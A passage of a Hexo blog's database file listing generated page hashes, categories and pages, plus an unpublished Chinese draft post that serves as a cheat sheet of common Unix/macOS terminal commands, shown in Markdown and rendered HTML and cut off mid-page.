c055d4dba9e3527504360ca75","modified":1568873099706},{"_id":"public/2018-gm-1/index.html","hash":"adda9e85e28f394a693318677d5429fd71918a6b","modified":1568873099706},{"_id":"public/2018-keystonejs入门教程之环境搭建/index.html","hash":"dd4ce8999d3424416968ede38e9104c174c89b4c","modified":1568873099706},{"_id":"public/archives/index.html","hash":"c52d5bb5991164b776af51cb3bbdbcd7e5f3d47f","modified":1568873099706},{"_id":"public/archives/page/2/index.html","hash":"d8d7f273c96bfb1086eeb464ee2a7fea97bc224c","modified":1568873099706},{"_id":"public/archives/page/3/index.html","hash":"fcd963952643e74e5edf1a89d50a1da6c6e1046f","modified":1568873099706},{"_id":"public/archives/page/5/index.html","hash":"eb29bb634acbdf762d422fd44d7dbd276e0bc179","modified":1568873099706},{"_id":"public/archives/page/4/index.html","hash":"d22b3bfffdd48a68bda0b5e75265f4142d4c7024","modified":1568873099706},{"_id":"public/archives/page/7/index.html","hash":"4081c77591e9db84f0689f2e6a888814e78142dd","modified":1568873099706},{"_id":"public/archives/page/8/index.html","hash":"d146bf4ac3872b53e623dc1690417685fed7b1ef","modified":1568873099706},{"_id":"public/archives/page/6/index.html","hash":"d0d8d31d5a060af25dec71b508bbf1d2f7517c65","modified":1568873099706},{"_id":"public/archives/2017/index.html","hash":"78793faf56bc68bc56cf80ad99b10b9418659998","modified":1568873099706},{"_id":"public/archives/page/9/index.html","hash":"f070d2ce2cb5d817900674060fa7ca7402dd620c","modified":1568873099707},{"_id":"public/archives/2018/index.html","hash":"9fa1c8902de1418af9d9085aa080294741e74622","modified":1568873099707},{"_id":"public/archives/2017/07/index.html","hash":"b55f8364482eb3ddfb5e9babe81582ba3fc1961a","modified":1568873099707},{"_id":"public/archives/2018/04/index.html","hash":"4049334ac810363e23a599600663eb336ec323e3","modified":1568873099707},{"_id":"public/archives/2018/08/index.html","hash":"2291683e9293e528dcf40438a74d54620fa305a5","modified":1568873099707},{"_id":"public/archives/2018/07/index.html","hash":"2e29971e225a6a3bb116f87dee6052e44f5172a0","modified":1568873099707},{"_id":"public/archives/2018/12/index.html","hash":"fca22ebd760121adf3220c4e24113d855f7295f4","modified":1568873099707},{"_id":"public/archives/2018/page/2/index.html","hash":"8653477243222963ade3fa5d847ae471f8a647fb","modified":1568873099707},{"_id":"public/archives/2018/page/3/index.html","hash":"98d4afc12c8969eda8a1921414b07d085c1b8619","modified":1568873099707},{"_id":"public/archives/2019/index.html","hash":"20f3af154c917ff5287b53510c37f978ebc5de94","modified":1568873099707},{"_id":"public/archives/2019/page/2/index.html","hash":"c715c0c043f96aa2e10848433406bae4457b3084","modified":1568873099707},{"_id":"public/archives/2019/page/3/index.html","hash":"4383c496a37b44202c54cc089ffb0d5bf64e460e","modified":1568873099707},{"_id":"public/archives/2019/page/4/index.html","hash":"fe776ace1ae79a53da584dda97cd4e6dda40a0c6","modified":1568873099707},{"_id":"public/archives/2019/page/6/index.html","hash":"947f7a9cd4b79af44e0721db8084f69f173e168f","modified":1568873099708},{"_id":"public/archives/2019/01/index.html","hash":"3d4ceff6008e89a7d12c070962c935a68c987d71","modified":1568873099708},{"_id":"public/archives/2019/page/5/index.html","hash":"ebd205e6ebca848b1164e997fc29e6155589bd8d","modified":1568873099708},{"_id":"public/archives/2019/02/index.html","hash":"824e027835d103e3476c762d9a646ae7e3b95d1f","modified":1568873099708},{"_id":"public/archives/2019/03/index.html","hash":"f7d5ec3b5cb64a6c77ef09b71f1d5e764fbde241","modified":1568873099708},{"_id":"public/archives/2019/04/index.html","hash":"46e4de7a246eec087c13f5dad62b4640bae8189e","modified":1568873099708},{"_id":"public/archives/2019/06/index.html","hash":"ba0efa59d5d57f187190673e4e5e1db2d00b52e5","modified":1568873099708},{"_id":"public/archives/2019/05/index.html","hash":"50e7a7b5378b6906e60da92f5e454f078578478c","modified":1568873099708},{"_id":"public/archives/2019/07/index.html","hash":"7d19321dd598379585dc3b4c80111ce6f303fafc","modified":1568873099708},{"_id":"public/archives/2019/08/index.html","hash":"91453bf06baf3c5b317261f2520dd0e16493d001","modified":1568873099708},{"_id":"public/archives/2019/05/page/2/index.html","hash":"e4c75ed2d4379d1873e5636aae3d1e15ed76d0cb","modified":1568873099708},{"_id":"public/archives/2019/05/page/3/index.html","hash":"4cb5de91ec879cbdef27c16f8f82786b08748add","modified":1568873099708},{"_id":"public/categories/前端/index.html","hash":"efff1f7832d5a22e24e8fa4ef348e9066a2d3d19","modified":1568873099708},{"_id":"public/categories/前端/page/2/index.html","hash":"331d6ed2b548de6b110ef610e56b413f8022098a","modified":1568873099708},{"_id":"public/categories/其他/index.html","hash":"2e342c27650a3a7a7ec1118e00e268a2b3381c62","modified":1568873099708},{"_id":"public/categories/后端/index.html","hash":"3bc73cddf880de82c80ec177c580c626aa6a8f1a","modified":1568873099708},{"_id":"public/categories/基础/index.html","hash":"f361e0208fe25d28f07b84598990054effb2f3d8","modified":1568873099709},{"_id":"public/categories/前端/page/4/index.html","hash":"2dcf7f736823034b8c8b5133b4bc43e5da9d878e","modified":1568873099709},{"_id":"public/categories/前端/page/5/index.html","hash":"8cd599871fc5a341a65b3777a43a56846596e8c8","modified":1568873099709},{"_id":"public/categories/框架与库/index.html","hash":"137b2abefc582a7ffecbc0b3b40ea500547b3de8","modified":1568873099709},{"_id":"public/categories/基础/计算机组成原理/index.html","hash":"499cdac22057a814f5f13256481491215501398e","modified":1568873099709},{"_id":"public/categories/框架与库/Vue/index.html","hash":"711c788cc55aced8b8d2f648a0009eb67ed56cae","modified":1568873099709},{"_id":"public/categories/框架与库/Vue/page/2/index.html","hash":"46f7d9594080d53137ffb49ed3d1867d31dc0192","modified":1568873099709},{"_id":"public/categories/基础/数据结构与算法/index.html","hash":"cd97c7ef5e274b398af51e315c2b0455848b10fd","modified":1568873099709},{"_id":"public/categories/基础/数据结构与算法/page/2/index.html","hash":"2b578ff9a1943f3e860a0fdd7c0bae03265e1f94","modified":1568873099709},{"_id":"public/categories/框架与库/React/index.html","hash":"20197579a67b208fc304082f8e90e78b835b8e08","modified":1568873099709},{"_id":"public/index.html","hash":"6442bec22b4c05ddf52e82aff0e92aa0be1d3a5c","modified":1568873099709},{"_id":"public/categories/前端/page/3/index.html","hash":"2c5e56611a47440953aded35cfdf9aaa4b690af1","modified":1568873099709},{"_id":"public/categories/框架与库/page/2/index.html","hash":"e08ff426951a64b33430bae594d416c4f35d1342","modified":1568873099709},{"_id":"public/categories/基础/page/2/index.html","hash":"e4980aeaaa2c562dc8c3ca64a145f7f21429ef95","modified":1568873099709},{"_id":"public/page/2/index.html","hash":"22a9c367f555c5d951711527513af8847860dbc3","modified":1568873099709},{"_id":"public/page/4/index.html","hash":"59c7f9a932336eef969a259e9bac7dba5759b24b","modified":1568873099710},{"_id":"public/page/5/index.html","hash":"d7840d861ea9234f8854ab86f39e408cc23c8fce","modified":1568873099710},{"_id":"public/page/6/index.html","hash":"f8feb994488ae57f84102e0b4808a6ebc35e8f88","modified":1568873099710},{"_id":"public/page/8/index.html","hash":"28a4b7eb9018fb7254efa06041783b17ddf563a2","modified":1568873099710},{"_id":"public/page/3/index.html","hash":"439c17fb09f5a6e35de687f53736dbdfc119393b","modified":1568873099710},{"_id":"public/page/7/index.html","hash":"14ecc4c8ecb870f1e695296dc7d80e50a4fa413d","modified":1568873099710},{"_id":"public/page/9/index.html","hash":"38709eac7a32133fc081a9e546ef85b053d2f3bd","modified":1568873099710},{"_id":"public/tags/node/index.html","hash":"10acfd62e7b2affd56976e61d21e38a3a89fadb4","modified":1568873099710},{"_id":"public/tags/备忘/index.html","hash":"7e74007ee7ffad7b247101dc55becd613fcf5489","modified":1568873099710},{"_id":"public/tags/动效/index.html","hash":"076a2ead544870298904046e9e8e6248cf3b89f0","modified":1568873099710},{"_id":"public/tags/hexo/index.html","hash":"efcb3e09df35f270ba4ed0e4cfd5459500d74846","modified":1568873099710},{"_id":"public/tags/JavaScript/index.html","hash":"a564a1cb982869df63b4f4bd69b03d1b484e8298","modified":1568873099710},{"_id":"public/tags/JavaScript/page/2/index.html","hash":"3ae40a0717673e1261ace739acaffbf3747634f4","modified":1568873099710},{"_id":"public/tags/git/index.html","hash":"8f86aece3b86fb9cc699c13429910ef4469325e6","modified":1568873099710},{"_id":"public/tags/工具/index.html","hash":"e0a19c1328c24b0033397df3dc972fab81623b35","modified":1568873099711},{"_id":"public/tags/canvas/index.html","hash":"168e5184c7434db5a16f56aa005d68e8fc82732e","modified":1568873099711},{"_id":"public/tags/笔记/index.html","hash":"11544fc9bae7b10ba8bef9cc0f1bda647d4ded50","modified":1568873099711},{"_id":"public/tags/JavaScript/page/3/index.html","hash":"b6c689408fa3d2819cfb842ca6bf33d81a122232","modified":1568873099711},{"_id":"public/tags/keystonejs/index.html","hash":"248085f7eb8ac7272c17cc2d4854348238782fb6","modified":1568873099711},{"_id":"public/tags/cms/index.html","hash":"e156d19e145a95af747e357fdf74d6bcd726c975","modified":1568873099711},{"_id":"public/tags/gm/index.html","hash":"3b9a63cf175fd65d3821f49ed7a6f0723162dff9","modified":1568873099711},{"_id":"public/tags/CSS/index.html","hash":"fdfdfe41d7488f055947e6062acb89cb5ff4757e","modified":1568873099711},{"_id":"public/tags/HTML/index.html","hash":"df0fee4968dc2432dc03a622eafcc026f81b70e8","modified":1568873099711},{"_id":"public/tags/Vue/index.html","hash":"0f44f5e34a14fb79c3ea3acbf983c28cbf49e8e5","modified":1568873099711},{"_id":"public/tags/Vue/page/2/index.html","hash":"b258347bbebc9f7ef405318260c9c4d68ebe5ecb","modified":1568873099711},{"_id":"public/tags/video/index.html","hash":"a460232179160d8aeb628653c6cf2b4aacc62999","modified":1568873099711},{"_id":"public/tags/svg/index.html","hash":"cb61100799090303a15965fdfb5876decd8f4391","modified":1568873099711},{"_id":"public/tags/github/index.html","hash":"a3d9ac462cc66485dadf1d804ddbb79b83523eb5","modified":1568873099711},{"_id":"public/tags/计算机/index.html","hash":"b12bc6c269ecfa81ff48feb1cf4830af2c12c9a7","modified":1568873099712},{"_id":"public/tags/React/index.html","hash":"4fa85d9dfbfc750f190f43be6541269c6f5e55cc","modified":1568873099712},{"_id":"public/tags/jQuery/index.html","hash":"496c61503a2c0856fbfa6fd88dcda2963ea92c69","modified":1568873099712},{"_id":"public/tags/cookie/index.html","hash":"086e4a2f4ae6dd4cbf1a850fe66460c15cc07dcd","modified":1568873099712},{"_id":"public/tags/webpack/index.html","hash":"4d2921ab60fc428c78ca39b60f0c0ab97e3dcc6e","modified":1568873099712},{"_id":"public/tags/JavaScript/page/4/index.html","hash":"ac4f18c297bd8e12a5ac80641618853fc9467035","modified":1568873099712},{"_id":"public/tags/JavaScript/page/5/index.html","hash":"404a9e53a893f6603f1f7b4b06a88147113ddf32","modified":1568873099712},{"_id":"public/tags/笔记/page/2/index.html","hash":"3e4e6cf310846a8b0f79935b9b7d44579da7c467","modified":1568873099712},{"_id":"public/archives/2019/page/7/index.html","hash":"5b380de2691fcc4f394a0619e54804cb3417f889","modified":1568873099716},{"_id":"public/archives/2019/09/index.html","hash":"e5652a4d7a79ba8e38b5d31a49016e8737b06c49","modified":1568873099716},{"_id":"public/categories/工具/index.html","hash":"97e2c0e6a49c928ba7ff75279f2f055caa1d7f8c","modified":1568873099716},{"_id":"public/webpack-advance-2/import.jpg","hash":"ab6350493c77b0c5f300d0426569ea6bebb2d9ff","modified":1568873099717},{"_id":"public/webpack-advance-2/large-number2.jpg","hash":"9c384442e203760415b4d3561c40563657673528","modified":1568873099717},{"_id":"public/webpack-advance-2/large-number.jpg","hash":"6528f2ae8e43f79929b10bd720068173b896a667","modified":1568873099717},{"_id":"public/webpack-advance-2/error.jpg","hash":"83d18a48543183514ca2d0fc4e4e3473c1c01bcd","modified":1568873099717},{"_id":"public/webpack-advance-1/px2rem.jpg","hash":"89553d445ecda667f2112a9d7dc722318128a004","modified":1568873099718},{"_id":"public/webpack-advance-2/scope-hoisting.jpg","hash":"e1eddbbfcb5a8574bfc8e028ed063cfe3622536a","modified":1568873099718},{"_id":"public/webpack-advance-2/module.jpg","hash":"f206c9c9d532936324d36a2da8214f15f34c31d9","modified":1568873099718}],"Category":[{"name":"前端","_id":"ck0m3d8ea0004wovvqa9pis3x"},{"name":"其他","_id":"ck0m3d8ef0008wovv0man6ab1"},{"name":"转载","parent":"ck0m3d8ea0004wovvqa9pis3x","_id":"ck0m3d8oj000qwovvqootkcgw"},{"name":"后端","_id":"ck0m3d8rk001twovv33s0jwwp"},{"name":"基础","_id":"ck0m3d8xk006awovv0c3r2anw"},{"name":"框架与库","_id":"ck0m3d8xn006jwovvf2j6vqso"},{"name":"计算机组成原理","parent":"ck0m3d8xk006awovv0c3r2anw","_id":"ck0m3d8xs006ywovv35tom2v1"},{"name":"Vue","parent":"ck0m3d8xn006jwovvf2j6vqso","_id":"ck0m3d8xv0078wovvyc5xx9vr"},{"name":"数据结构与算法","parent":"ck0m3d8xk006awovv0c3r2anw","_id":"ck0m3d8yd009fwovvry5nw6wv"},{"name":"React","parent":"ck0m3d8xn006jwovvf2j6vqso","_id":"ck0m3d8yj00a5wovv5xnkquo8"},{"name":"工具","_id":"ck0m3gw8000bwwovvv9k6wdvi"}],"Data":[],"Page":[{"title":"分类","date":"2018-06-27T01:34:18.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2018-06-27 09:34:18\ntype: \"categories\"\ncomments: false\n---\n","updated":"2019-04-25T07:49:45.471Z","path":"categories/index.html","layout":"page","_id":"ck0m3d8e50001wovvxg9eey56","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"关于我","date":"2018-06-27T01:29:33.000Z","_content":"","source":"about/index.md","raw":"---\ntitle: 关于我\ndate: 2018-06-27 09:29:33\n---\n","updated":"2019-05-15T07:09:42.805Z","path":"about/index.html","comments":1,"layout":"page","_id":"ck0m3d8e80003wovvzzw9935p","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"标签","date":"2018-06-27T01:32:22.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2018-06-27 09:32:22\ntype: \"tags\"\ncomments: false\n---\n","updated":"2019-04-25T07:49:45.473Z","path":"tags/index.html","layout":"page","_id":"ck0m3d8ed0006wovv5zdx4xuw","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"other","date":"2018-06-27T01:36:26.000Z","_content":"","source":"other/index.md","raw":"---\ntitle: other\ndate: 2018-06-27 09:36:26\n---\n","updated":"2019-04-25T07:49:45.472Z","path":"other/index.html","comments":1,"layout":"page","_id":"ck0m3d8ee0007wovv9xznd07i","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"macOS-cmd","date":"2019-04-18T08:24:45.000Z","updated":"2019-04-18T08:24:45.000Z","_content":"\n# 概述\n\n<!-- more -->\n# 详述\n## 查看公钥\n```bash\ncd ~/.ssh\nls\ncat id_rsa.pub\n```\n\n## MacOS 常用终端命令大全：\n\n目录操作\n\n命令——功能描述——示例\n\nmkdir——创建一个目录——mkdir dirname\n\nrmdir——删除一个目录——rmdir dirname\n\nmvdir——移动或重命名一个目录——mvdir dir1 dir2\n\ncd——改变当前目录——cd dirname\n\npwd——显示当前目录的路径名——pwd\n\nls——显示当前目录的内容——ls -la\n\ndircmp——比较两个目录的内容——dircmp dir1 dir2\n\n\n文件操作\n\n命令——功能描述——示例\n\ncat——显示或连接文件————cat filename\n\npg分页格式化显示文件内容——pg filename\n\nmore——分屏显示文件内容——more filename\n\nod——显示非文本文件的内容——od -c filename\n\ncp——复制文件或目录——cp file1 file2\n\nrm——删除文件或目录——rm filename\n\nmv——改变文件名或所在目录——mv file1 file2\n\nln——联接文件——ln -s file1 file2\n\nfind——使用匹配表达式查找文件——find . -name “*.c” -print\n\nfile——显示文件类型——file filename\n\nopen——使用默认的程序打开文件——open filename（open . 打开当前目录）\n\n\n选择操作\n\n命令——功能描述——示例\n\nhead——显示文件的最初几行——head -20 filename\n\ntail——显示文件的最后几行——tail -15 filename\n\ncut——显示文件每行中的某些域——cut -f1,7 -d: /etc/passwd\n\ncolrm——从标准输入中删除若干列——colrm 8 20 file2\n\npaste——横向连接文件——paste file1 file2\n\ndiff——比较并显示两个文件的差异——diff file1 file2\n\nsed————非交互方式流编辑器——sed “s/red/green/g” filename\n\ngrep——在文件中按模式查找——grep “^[a-zA-Z]” filename\n\nawk——在文件中查找并处理模式——awk ‘{print 111}’ filename\n\nsort——排序或归并文件——sort -d -f -u file1\n\nuniq——去掉文件中的重复行——uniq file1 file2\n\ncomm——显示两有序文件的公共和非公共行——comm file1 file2\n\nwc——统计文件的字符数、词数和行数——wc filename\n\nnl——给文件加上行号——nl file1 >file2\n\n\n安全操作\n\n命令——功能描述——示例\n\npasswd——修改用户密码——passwd\n\nchmod——改变文件或目录的权限——chmod ug+x filename\n\numask————定义创建文件的权限掩码——umask 027\n\nchown——改变文件或目录的属主——chown newowner filename\n\nchgrp——改变文件或目录的所属组——chgrp staff filename\n\nxlock——给终端上锁——xlock -remote\n\n\n编程操作\n\n命令——功能描述——示例\n\nmake——维护可执行程序的最新版本——make\n\ntouch——更新文件的访问和修改时间——touch -m 05202400 filename\n\ndbx——命令行界面调试工具——dbx a.out\n\nxde——图形用户界面调试工具——xde a.out\n\n\n进程操作\n\n命令——功能描述——示例\n\nps——显示进程当前状态——ps u\n\nkill——终止进程——kill -9 30142\n\nnice——改变待执行命令的优先级——nice cc -c *.c\n\nrenice——改变已运行进程的优先级——renice +20 32768\n\n\n时间操作\n\n命令——功能描述——示例\n\ndate——显示系统的当前日期和时间——date\n\ncal——显示日历——cal 8 1996\n\ntime——统计程序的执行时间——time a.out\n\n\n网络与通信操作\n\n命令——功能描述——示例\n\ntelnet——远程登录——telnet hpc.sp.net.edu.cn\n\nrlogin——远程登录——rlogin hostname -l username\n\nrsh——在远程主机执行指定命令——rsh f01n03 date\n\nftp——在本地主机与远程主机之间传输文件——ftp ftp.sp.net.edu.cn\n\nrcp——在本地主机与远程主机 之间复制文件——rcp file1 host1:file2\n\nping——给一个网络主机发送 回应请求——ping hpc.sp.net.edu.cn\n\nmail——阅读和发送电子邮件——mail\n\nwrite——给另一用户发送报文——write username pts/1\n\nmesg——允许或拒绝接收报文——mesg n\n\n\nKorn Shell 命令\n\n命令——功能描述——示例\n\nhistory——列出最近执行过的 几条命令及编号——history\n\nr——重复执行最近执行过的 某条命令——r -2\n\nalias——给某个命令定义别名——alias del=rm -i\n\nunalias——取消对某个别名的定义——unalias del\n\n\n其它命令\n\n命令——功能描述——示例\n\nuname——显示操作系统的有关信息——uname -a\n\nclear——清除屏幕或窗口内容——clear\n\nenv——显示当前所有设置过的环境变量——env\n\nwho——列出当前登录的所有用户——who\n\nwhoami——显示当前正进行操作的用户名——whoami\n\ntty——显示终端或伪终端的名称——tty\n\nstty——显示或重置控制键定义——stty -a\n\ndu——查询磁盘使用情况——du -k subdir\n\ndf——显示文件系统的总空间和可用空间——df /tmp\n\nw——显示当前系统活动的总信息——w\n\n\n一些常用技巧\n\n所以你可以使用▲（上箭头）或▼（下箭头）来上下移动，\n使用　空格键 来翻页，输入/和关键字来按照关键字搜索\n按Q来退出使用指南页面\ntab按键自动补全唯一路径\n中止一个错误的或者发疯的命令，可以使用组合键control + C。\n你可以在执行前编辑命令，只需要使用箭头和键盘上的其他字母。\n没有输入任何命令时，你可以用▲和▼来浏览历史命令。同样可以编辑和再次执行。\n你也可以使用history命令查看历史记录。\n你可以使用组合键control + L清屏。\n# 参考","source":"_drafts/macOS-cmd.md","raw":"---\ntitle: macOS-cmd\ntags:\n  - html\n  - css\n  - javascript\ncategories:\n  - 前端\ndate: 2019-04-18 16:24:45\nupdated: 2019-04-18 16:24:45\n---\n\n# 概述\n\n<!-- more -->\n# 详述\n## 查看公钥\n```bash\ncd ~/.ssh\nls\ncat id_rsa.pub\n```\n\n## MacOS 常用终端命令大全：\n\n目录操作\n\n命令——功能描述——示例\n\nmkdir——创建一个目录——mkdir dirname\n\nrmdir——删除一个目录——rmdir dirname\n\nmvdir——移动或重命名一个目录——mvdir dir1 dir2\n\ncd——改变当前目录——cd dirname\n\npwd——显示当前目录的路径名——pwd\n\nls——显示当前目录的内容——ls -la\n\ndircmp——比较两个目录的内容——dircmp dir1 dir2\n\n\n文件操作\n\n命令——功能描述——示例\n\ncat——显示或连接文件————cat filename\n\npg分页格式化显示文件内容——pg filename\n\nmore——分屏显示文件内容——more filename\n\nod——显示非文本文件的内容——od -c filename\n\ncp——复制文件或目录——cp file1 file2\n\nrm——删除文件或目录——rm filename\n\nmv——改变文件名或所在目录——mv file1 file2\n\nln——联接文件——ln -s file1 file2\n\nfind——使用匹配表达式查找文件——find . -name “*.c” -print\n\nfile——显示文件类型——file filename\n\nopen——使用默认的程序打开文件——open filename（open . 打开当前目录）\n\n\n选择操作\n\n命令——功能描述——示例\n\nhead——显示文件的最初几行——head -20 filename\n\ntail——显示文件的最后几行——tail -15 filename\n\ncut——显示文件每行中的某些域——cut -f1,7 -d: /etc/passwd\n\ncolrm——从标准输入中删除若干列——colrm 8 20 file2\n\npaste——横向连接文件——paste file1 file2\n\ndiff——比较并显示两个文件的差异——diff file1 file2\n\nsed————非交互方式流编辑器——sed “s/red/green/g” filename\n\ngrep——在文件中按模式查找——grep “^[a-zA-Z]” filename\n\nawk——在文件中查找并处理模式——awk ‘{print 111}’ filename\n\nsort——排序或归并文件——sort -d -f -u file1\n\nuniq——去掉文件中的重复行——uniq file1 file2\n\ncomm——显示两有序文件的公共和非公共行——comm file1 file2\n\nwc——统计文件的字符数、词数和行数——wc filename\n\nnl——给文件加上行号——nl file1 >file2\n\n\n安全操作\n\n命令——功能描述——示例\n\npasswd——修改用户密码——passwd\n\nchmod——改变文件或目录的权限——chmod ug+x filename\n\numask————定义创建文件的权限掩码——umask 027\n\nchown——改变文件或目录的属主——chown newowner filename\n\nchgrp——改变文件或目录的所属组——chgrp staff filename\n\nxlock——给终端上锁——xlock -remote\n\n\n编程操作\n\n命令——功能描述——示例\n\nmake——维护可执行程序的最新版本——make\n\ntouch——更新文件的访问和修改时间——touch -m 05202400 filename\n\ndbx——命令行界面调试工具——dbx a.out\n\nxde——图形用户界面调试工具——xde a.out\n\n\n进程操作\n\n命令——功能描述——示例\n\nps——显示进程当前状态——ps u\n\nkill——终止进程——kill -9 30142\n\nnice——改变待执行命令的优先级——nice cc -c *.c\n\nrenice——改变已运行进程的优先级——renice +20 32768\n\n\n时间操作\n\n命令——功能描述——示例\n\ndate——显示系统的当前日期和时间——date\n\ncal——显示日历——cal 8 1996\n\ntime——统计程序的执行时间——time a.out\n\n\n网络与通信操作\n\n命令——功能描述——示例\n\ntelnet——远程登录——telnet hpc.sp.net.edu.cn\n\nrlogin——远程登录——rlogin hostname -l username\n\nrsh——在远程主机执行指定命令——rsh f01n03 date\n\nftp——在本地主机与远程主机之间传输文件——ftp ftp.sp.net.edu.cn\n\nrcp——在本地主机与远程主机 之间复制文件——rcp file1 host1:file2\n\nping——给一个网络主机发送 回应请求——ping hpc.sp.net.edu.cn\n\nmail——阅读和发送电子邮件——mail\n\nwrite——给另一用户发送报文——write username pts/1\n\nmesg——允许或拒绝接收报文——mesg n\n\n\nKorn Shell 命令\n\n命令——功能描述——示例\n\nhistory——列出最近执行过的 几条命令及编号——history\n\nr——重复执行最近执行过的 某条命令——r -2\n\nalias——给某个命令定义别名——alias del=rm -i\n\nunalias——取消对某个别名的定义——unalias del\n\n\n其它命令\n\n命令——功能描述——示例\n\nuname——显示操作系统的有关信息——uname -a\n\nclear——清除屏幕或窗口内容——clear\n\nenv——显示当前所有设置过的环境变量——env\n\nwho——列出当前登录的所有用户——who\n\nwhoami——显示当前正进行操作的用户名——whoami\n\ntty——显示终端或伪终端的名称——tty\n\nstty——显示或重置控制键定义——stty -a\n\ndu——查询磁盘使用情况——du -k subdir\n\ndf——显示文件系统的总空间和可用空间——df /tmp\n\nw——显示当前系统活动的总信息——w\n\n\n一些常用技巧\n\n所以你可以使用▲（上箭头）或▼（下箭头）来上下移动，\n使用　空格键 来翻页，输入/和关键字来按照关键字搜索\n按Q来退出使用指南页面\ntab按键自动补全唯一路径\n中止一个错误的或者发疯的命令，可以使用组合键control + C。\n你可以在执行前编辑命令，只需要使用箭头和键盘上的其他字母。\n没有输入任何命令时，你可以用▲和▼来浏览历史命令。同样可以编辑和再次执行。\n你也可以使用history命令查看历史记录。\n你可以使用组合键control + L清屏。\n# 参考","slug":"macOS-cmd","published":0,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8e00000wovv06vy996j","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"查看公钥\"><a href=\"#查看公钥\" class=\"headerlink\" title=\"查看公钥\"></a>查看公钥</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\">ls</span><br><span class=\"line\">cat id_rsa.pub</span><br></pre></td></tr></table></figure>\n<h2 id=\"MacOS-常用终端命令大全：\"><a href=\"#MacOS-常用终端命令大全：\" class=\"headerlink\" title=\"MacOS 常用终端命令大全：\"></a>MacOS 常用终端命令大全：</h2><p>目录操作</p>\n<p>命令——功能描述——示例</p>\n<p>mkdir——创建一个目录——mkdir dirname</p>\n<p>rmdir——删除一个目录——rmdir dirname</p>\n<p>mvdir——移动或重命名一个目录——mvdir dir1 dir2</p>\n<p>cd——改变当前目录——cd dirname</p>\n<p>pwd——显示当前目录的路径名——pwd</p>\n<p>ls——显示当前目录的内容——ls -la</p>\n<p>dircmp——比较两个目录的内容——dircmp dir1 dir2</p>\n<p>文件操作</p>\n<p>命令——功能描述——示例</p>\n<p>cat——显示或连接文件————cat filename</p>\n<p>pg分页格式化显示文件内容——pg filename</p>\n<p>more——分屏显示文件内容——more filename</p>\n<p>od——显示非文本文件的内容——od -c filename</p>\n<p>cp——复制文件或目录——cp file1 file2</p>\n<p>rm——删除文件或目录——rm filename</p>\n<p>mv——改变文件名或所在目录——mv file1 file2</p>\n<p>ln——联接文件——ln -s file1 file2</p>\n<p>find——使用匹配表达式查找文件——find . -name “*.c” -print</p>\n<p>file——显示文件类型——file filename</p>\n<p>open——使用默认的程序打开文件——open filename（open . 打开当前目录）</p>\n<p>选择操作</p>\n<p>命令——功能描述——示例</p>\n<p>head——显示文件的最初几行——head -20 filename</p>\n<p>tail——显示文件的最后几行——tail -15 filename</p>\n<p>cut——显示文件每行中的某些域——cut -f1,7 -d: /etc/passwd</p>\n<p>colrm——从标准输入中删除若干列——colrm 8 20 file2</p>\n<p>paste——横向连接文件——paste file1 file2</p>\n<p>diff——比较并显示两个文件的差异——diff file1 file2</p>\n<p>sed————非交互方式流编辑器——sed “s/red/green/g” filename</p>\n<p>grep——在文件中按模式查找——grep “^[a-zA-Z]” filename</p>\n<p>awk——在文件中查找并处理模式——awk ‘{print 111}’ filename</p>\n<p>sort——排序或归并文件——sort -d -f -u file1</p>\n<p>uniq——去掉文件中的重复行——uniq file1 file2</p>\n<p>comm——显示两有序文件的公共和非公共行——comm file1 file2</p>\n<p>wc——统计文件的字符数、词数和行数——wc filename</p>\n<p>nl——给文件加上行号——nl file1 &gt;file2</p>\n<p>安全操作</p>\n<p>命令——功能描述——示例</p>\n<p>passwd——修改用户密码——passwd</p>\n<p>chmod——改变文件或目录的权限——chmod ug+x filename</p>\n<p>umask————定义创建文件的权限掩码——umask 027</p>\n<p>chown——改变文件或目录的属主——chown newowner filename</p>\n<p>chgrp——改变文件或目录的所属组——chgrp staff filename</p>\n<p>xlock——给终端上锁——xlock -remote</p>\n<p>编程操作</p>\n<p>命令——功能描述——示例</p>\n<p>make——维护可执行程序的最新版本——make</p>\n<p>touch——更新文件的访问和修改时间——touch -m 05202400 filename</p>\n<p>dbx——命令行界面调试工具——dbx a.out</p>\n<p>xde——图形用户界面调试工具——xde a.out</p>\n<p>进程操作</p>\n<p>命令——功能描述——示例</p>\n<p>ps——显示进程当前状态——ps u</p>\n<p>kill——终止进程——kill -9 30142</p>\n<p>nice——改变待执行命令的优先级——nice cc -c *.c</p>\n<p>renice——改变已运行进程的优先级——renice +20 32768</p>\n<p>时间操作</p>\n<p>命令——功能描述——示例</p>\n<p>date——显示系统的当前日期和时间——date</p>\n<p>cal——显示日历——cal 8 1996</p>\n<p>time——统计程序的执行时间——time a.out</p>\n<p>网络与通信操作</p>\n<p>命令——功能描述——示例</p>\n<p>telnet——远程登录——telnet hpc.sp.net.edu.cn</p>\n<p>rlogin——远程登录——rlogin hostname -l username</p>\n<p>rsh——在远程主机执行指定命令——rsh f01n03 date</p>\n<p>ftp——在本地主机与远程主机之间传输文件——ftp ftp.sp.net.edu.cn</p>\n<p>rcp——在本地主机与远程主机 之间复制文件——rcp file1 host1:file2</p>\n<p>ping——给一个网络主机发送 回应请求——ping hpc.sp.net.edu.cn</p>\n<p>mail——阅读和发送电子邮件——mail</p>\n<p>write——给另一用户发送报文——write username pts/1</p>\n<p>mesg——允许或拒绝接收报文——mesg n</p>\n<p>Korn Shell 命令</p>\n<p>命令——功能描述——示例</p>\n<p>history——列出最近执行过的 几条命令及编号——history</p>\n<p>r——重复执行最近执行过的 某条命令——r -2</p>\n<p>alias——给某个命令定义别名——alias del=rm -i</p>\n<p>unalias——取消对某个别名的定义——unalias 